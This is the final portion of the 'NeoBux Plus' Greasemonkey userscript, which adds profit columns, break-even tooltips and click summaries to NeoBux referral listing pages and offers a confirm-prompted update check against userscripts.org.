                    newColumn_PROFIT.id = "Profit_" + refID; // This ID is used by 'prototip' as an anchor to attach the tooltip to
// If the net profit is negative, format it differently
                    newColumn_PROFIT.style.setProperty("color", PROFIT >= 0 ? "#008000" : "#800000", "");
                    newColumn_PROFIT.innerHTML = PROFIT >= 0 ?
                            currencySymbol_Profit + fix(PROFIT) :
                            "(" + currencySymbol_Profit + fix(-PROFIT) + ")";
                    if (myAccount.preferences.profitColumn_shrinkContents) {
                        shrinkContents(newColumn_PROFIT);
                    }
// Insert the new 'Profit' column
                    currentRow.insertBefore(newColumn_PROFIT, lastColumn);
// If the current page is the rented referral listing page, create and insert the tooltips
                    if (currentPage.name === "rentedRefListing") {
                        var profitPerDay = (indivAvg * myAccount.rentedReferralClickValue) - expensesPerRefPerDay;
// Calculate how many days it will take for the referral to pay for its own recycle
// --> Assumes that the referral has clicked consistently at the current average 
// --> Odd results from this will be shown if the referral has vastly changing click patterns
// --> Will return 'More than '+dayLimit+' days' if it will take > dayLimit days to pay for own recycle (dayLimit: default = 30)
                        var daysTillPaidOwnRecycle = getDaysTillPaidOwnRecycle(
                                indivAvg, netProfit_exclRecycles,
                                expensesPerRefPerDay);
                        if (isNaN(daysTillPaidOwnRecycle) &&
                                (parseFloat(indivAvg) < parseFloat(
                                minBreakEvenAvgExcludingRecycles))) {
                            daysTillPaidOwnRecycle = "Never";
                        }
                        var tipContent = "<p>" + localString("referral") + ": <b>" + refID + "</b></p>" +
                                "<hr>" +
                                "<i><small>" + localString("expenses") + "</small></i><br/>" +
                                "Renewals <i><small>(" + (renewalPeriod === 1 ? "AutoPay" : (renewalPeriod + " day renewal")) + ")</small></i> = <b>$" + fix(renewalCostPerRefPerDay) + "</b><br/>";
// Add Golden / Golden Pack-specific lines to the tooltip
                        if (myAccount.accountType > 0) {
                            tipContent = tipContent + localString("goldenFee") + " <i><small>(" + localString("perRefPerDay") + ")</small></i> = <b>$" + fix(goldenFeePerRefPerDay) + "</b><br/>";
                        }
                        if (myAccount.accountType > 1) {
                            tipContent = tipContent + localString("goldenPackFee") + " <i><small>(" + localString("perRefPerDay") + ")</small></i> = <b>$" + fix(goldenPackFeePerRefPerDay) + "</b><br/>";
                        }
                        tipContent = tipContent +
                                localString("totalExpenses") + " <i><small>(" + localString("perRefPerDay") + ")</small></i> = <b>$" + fix(expensesPerRefPerDay) + "</b><br/>" +
                                "<br/>" +
                                localString("minimumAverage") + " <i><small>(" + localString("toBreakEven") + ")</small></i> = <b>" + fix(minBreakEvenAvgExcludingRecycles) + "</b><br/>" +
                                localString("grossIn") + " = <b>$" + fix(grossIn) + "</b><br/>" +
                                localString("grossOut") + " = <b>$" + fix(grossOut) + "</b><br/>" +
                                localString("currentProfit") + " = <b>$" + fix(netProfit_exclRecycles) + "</b><br/>" +
                                localString("currentProfit") + " <i><small>(" + localString("incl") + " " + recycleCost + " " + localString("recycle") + ")</small></i> = <b>$" + fix(netProfit_inclRecycles) + "</b><br/>" +
                                "<br/>" +
                                "<i><small>@ Average = <b>" + fix(indivAvg) + "</b></small></i>:<br/>" +
                                localString("netProfit") + " <i><small>(per day)</small></i> = <b>$" + fix(profitPerDay) + "</b><br/>" +
                                localString("daysToPayForOwnRecycle") + " = <b>" + daysTillPaidOwnRecycle + "</b><br/>";
                        if (!isNaN(daysTillPaidOwnRecycle)) {
                            tipContent = tipContent + "= <i>" + localString("day") + " # <b>" + (daysTillPaidOwnRecycle + numDaysOwned_decimal) + "</b></i><br/>";
                        }
                        tipContent = tipContent + "<br/>";
// Create and insert a new script node for the prototip tooltip javascript code to be run from
                        var script = document.createElement("script");
                        var text = document.createTextNode("new mk_tt('Profit_" + refID + "', 'left', '" + tipContent + "')");
                        script.type = "text/javascript";
                        script.appendChild(text);
                        currentRow.appendChild(script);
                    }
                }
            }
        }
// Set the size of the bottom row to match the size of the header row to accomodate for extra columns that have been added
        var footerRow = rows[rows.length - 1];
        rows[1].childNodes[0].colSpan =
                rows[rows.length - 2].childNodes[0].colSpan =
                footerRow.childNodes[0].colSpan = rows[2].childNodes.length;
// SUMMARY ROW @ bottom of the referral listing table
        if (myAccount.ultimatePreferences.showRecentAverage) {
            var totalClickAvg = sumOfAverages / (refCount + 1);
            if (isNaN(totalClickAvg)) {
                totalClickAvg = 0;
            }
            var nbsp = "&nbsp;&nbsp;&nbsp;&nbsp;";
            var footerRow_text = nbsp +
                    localString("totalClicks") + ": " + clickSum +
                    nbsp + localString("totalClickAvg") + ": " + fix(totalClickAvg);
            if (myAccount.accountType === 6) {
                footerRow_text = footerRow_text + nbsp + localString("lastdaysClickAvg") +
                        " (" + myAccount.ultimatePreferences.minigraphAvgInterval + "): " +
                        fix(sumOfMinigraphClickAvgs / (refCount + 1));
            }
            setHeaderProperties(footerRow.childNodes[0]);
            footerRow.childNodes[0].style.setProperty("line-height", "14px", "");
            footerRow_text = footerRow_text +
                    nbsp + localString("clickedToday") + ": " + todayClickers +
                    nbsp + localString("clickedYday") + ": " + ydayClickers +
                    nbsp + localString("zeroClickers") + ": " + zeroClickers +
                    nbsp + localString("others") + ": " + otherClickers +
                    nbsp;
            footerRow.childNodes[0].innerHTML = footerRow_text;
            if (myAccount.ultimatePreferences.RA_shrinkContents) {
                shrinkContents(footerRow.childNodes[0]);
            }
        }
        for (i = 0; i < headerRow.childNodes.length; i += 1) {
            headerRow.childNodes[i].style.width = (parseInt(
                    window.getComputedStyle(headerRow.childNodes[i],
                    null).width, 10) + 2) + "px";
        }
        mainTable.parentElement.style.width = (parseInt(
                window.getComputedStyle(mainTable.parentElement,
                null).width, 10) + 2 * headerRow.childNodes.length) + "px";
        var newWidth = parseInt(window.getComputedStyle(
                selectNode("//body/div[2]/div[1]/table"), null).width, 10);
        var nodesSnapshot = selectNodes("//body/div[contains(@style,'margin')][not(@id='tiptip_holder')]");
        nodesSnapshot[nodesSnapshot.length - 1].setAttribute("align", "center");
        var n;
        for (n = 0; n < nodesSnapshot.length; n += 1) {
            nodesSnapshot[n].style.width = "100%";
            if (n === nodesSnapshot.length - 1) {
                nodesSnapshot[n].children[2].style.width = newWidth + "px";
            } else {
                nodesSnapshot[n].children[0].style.width = newWidth + "px";
            }
        }
        var menuContainer = selectNode("//body/div[2]/div[1]/table/tbody/tr/td[1]");
        var menuContainerWidth = parseInt(window.getComputedStyle(menuContainer, null).width, 10);
        if (menuContainerWidth < parseFloat(menuContainer.width)) {
            newWidth += parseFloat(menuContainer.width) - menuContainerWidth + 2;
            for (n = 0; n < nodesSnapshot.length; n += 1) {
                if (n === nodesSnapshot.length - 1) {
                    nodesSnapshot[n].children[2].style.width = newWidth + "px";
                } else {
                    nodesSnapshot[n].children[0].style.width = newWidth + "px";
                }
            }
        }
        for (i = 0; i < 7; i += 1) {
            sortArrowTable = document.getElementById("sort_" + (i + 1));
            if (sortArrowTable) {
                sortArrowTable.style.display = sortArrowDisplayStyles[i];
            }
        }
    }

// CUSTOM FUNCTION - Compares two version numbers
// Returns true if current version < other version
    function otherVerIsNewerVersion(currentVerInput, otherVerInput) {
        var
            currentVer,
            i,
            otherVer,
            otherVerIsNewer;
        currentVer = currentVerInput.split(".");
        otherVer = otherVerInput.split(".");
        for (i = 0; i < currentVer.length; i += 1) {
            currentVer[i] = Number(currentVer[i]);
            otherVer[i] = Number(otherVer[i]);
        }
        otherVerIsNewer = false;
        if (currentVer[0] < otherVer[0]) {
            otherVerIsNewer = true;
        } else if (currentVer[0] === otherVer[0]) {
            if (currentVer[1] < otherVer[1]) {
                otherVerIsNewer = true;
            } else if (currentVer[1] === otherVer[1]) {
                if (currentVer[2] < otherVer[2]) {
                    otherVerIsNewer = true;
                } else if (currentVer[2] === otherVer[2]) {
                    if (currentVer[3] < otherVer[3]) {
                        otherVerIsNewer = true;
                    }
                }
            }
        }
        return otherVerIsNewer;
    }

    function checkForUpdates() {
        var
            otherVersion,
            time;
        time = (new Date()).getTime();
        if (myAccount.preferences.updateFrequency > 0 &&
                    time > myAccount.preferences.updateLastCheck +
                    myAccount.preferences.updateFrequency) {
            GM.xmlhttpRequest({
                method: "GET",
                url: "http://userscripts.org/scripts/source/78129.meta.js",
                onload: function (response) {
                    manipulatePrefs("updateLastCheck", time.toString(), "set");
                    if (response.status === 200) {
                        otherVersion = /\/\/\s*@version\s+(.*)\s*\n/i.exec(response.responseText)[1];
                        if (otherVerIsNewerVersion(version, otherVersion)) {
                            if (confirm(localString("newVersionAvailable", "NeoBux Plus") +
                                    "\n\n" + localString("currentVersion", version) +
                                    "\n" + localString("availableVersion", otherVersion) +
                                    "\n\n" + localString("doYouWishToUpdateTo", otherVersion))) {
                                top.location.href = "http://userscripts.org/scripts/source/78129.user.js";
                            }
                        }
                    }
                }
            });
        }
    }

    function ubarPos() {
        var script;
        script = document.createElement("script");
        script.textContent = "try { ubar_pos(0); } catch(e) { }";
        selectNode("//body").appendChild(script);
    }

    function main() {
        checkForUpdates();
        insertScriptVersion();
        insertLogo();
        if (toBool(manipulatePrefs("firstRun", true, "get"))) {
            ubarPos();
            firstRun();
        }
        switch (currentPage.name) {
        case "rentedRefListing":
            if (numberOfRentedReferrals > 0) {
                referralPage();
            }
            break;
        case "directRefListing":
            if (numberOfDirectReferrals > 0) {
                referralPage();
            }
            break;
        case "refStats":
            refStatsPage();
            break;
        }
        ubarPos();
    }

    return function () {
        setTimeout(main, 1000);
    };
}())();
} catch (e) {
    alert("Error in NeoBux Plus:\n" + e.toString() + "\n" + e.stack +
            "\nPlease report this error at:\n" +
            "http://userscripts.org/scripts/discuss/78129");
}
